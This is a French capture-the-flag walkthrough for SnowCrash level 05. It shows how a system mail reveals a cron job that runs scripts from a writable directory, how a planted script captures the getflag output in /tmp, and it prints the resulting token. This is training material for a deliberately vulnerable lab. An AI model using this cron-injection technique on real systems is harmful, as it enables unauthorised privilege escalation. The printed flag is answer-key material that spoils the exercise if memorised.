# Level 05 - Solution

## Étape 1 : Message de connexion

À la connexion, on reçoit un message :
```
You have new mail.
```

Cela indique qu'il y a un mail système à consulter.

## Étape 2 : Recherche du mail

Comme dans le level00, on utilise `find` pour localiser les fichiers de mail :

```bash
level05@SnowCrash:~$ cd ../../..
level05@SnowCrash:/$ find . -name "mail" 2>/dev/null
./usr/lib/byobu/mail
./var/mail
./var/spool/mail
./rofs/usr/lib/byobu/mail
./rofs/var/mail
./rofs/var/spool/mail
```

## Étape 3 : Consultation du mail

Consulter le fichier de configuration mail :
```bash
level05@SnowCrash:/$ cat ./usr/lib/byobu/mail
```

On trouve la ligne importante :
```bash
MAILFILE="/var/spool/mail/$USER"
```

Lire le mail :
```bash
level05@SnowCrash:/$ cat /var/spool/mail/level05
```

Le mail contient des informations sur une tâche cron.

## Étape 4 : Analyse de la tâche cron

Cette tâche exécute tous les scripts `.sh` présents dans `/opt/openarenaserver/` qui est un cron 


## Étape 5 : Exploitation - Injection de script malveillant

### Créer un script malveillant

Créer un script qui redirige la sortie de `getflag` vers un fichier accessible :

```bash
level05@SnowCrash:~$ echo 'getflag > /tmp/test.txt' > /opt/openarenaserver/test.sh
```

### Rendre le script exécutable

```bash
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/test.sh
```

### Attendre l'exécution du cron

Attendre 2 minutes maximum (la tâche cron s'exécute toutes les 2 minutes).

### Récupérer le résultat

```bash
level05@SnowCrash:~$ cat /tmp/test.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Résultat

🚩 **Flag** : `viuaaale9huek52boumoomioc`
